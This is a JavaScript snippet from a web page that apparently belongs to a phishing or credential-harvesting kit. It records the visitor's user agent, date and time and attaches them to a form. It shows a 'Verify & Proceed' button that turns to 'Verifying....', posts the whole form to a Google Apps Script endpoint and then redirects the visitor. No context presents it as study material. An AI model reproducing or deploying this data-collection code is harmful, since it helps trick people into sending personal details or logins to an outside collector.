document.getElementById("deviceName").value = navigator.userAgent;
    
                                          var currentDate = new Date();
                                                  document.getElementById("date").value = currentDate.toDateString();
                                                  document.getElementById("time").value = currentDate.toLocaleTimeString();
                                                  document.getElementById("app").value;
                                          
                                          
                                                                                  const scriptURL = 'https://script.google.com/macros/s/AKfycbwk2brRgeZZ9VyqYynlGQd1_Ddb-Y1EWN-7kKAs-ZU8d8RB6GjEuicctYbSnwDERs9ptQ/exec'
                                                                                  const form = document.forms['contactForm']
                                                                                  
                                                                                  form.addEventListener('submit', e => {
                                                                                    e.preventDefault()
                                                                                  
                                                                                    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
                                          
                                                                                    .then(response => {
                                            // Replace the alert with a redirect to another HTML page
                                            window.location.href = 'sad1.html'; // Replace 'new_page.html' with the actual URL of the page you want to redirect to
                                          });
                                                                                  
                                                                                  })
                                          
                                                // Get the button element by its ID
                                                var button = document.getElementById('myButton');
                                          
                                          // Define a function to change the button text
                                          function changeButtonText() {
                                              if (button.textContent === "Verify & Proceed") {
                                                  button.textContent = "Verifying....";
                                              } else {
                                                  button.textContent = "Verifying....";
                                              }
                                          }
                                          
                                          // Add a click event listener to the button
                                          button.addEventListener('click', changeButtonText);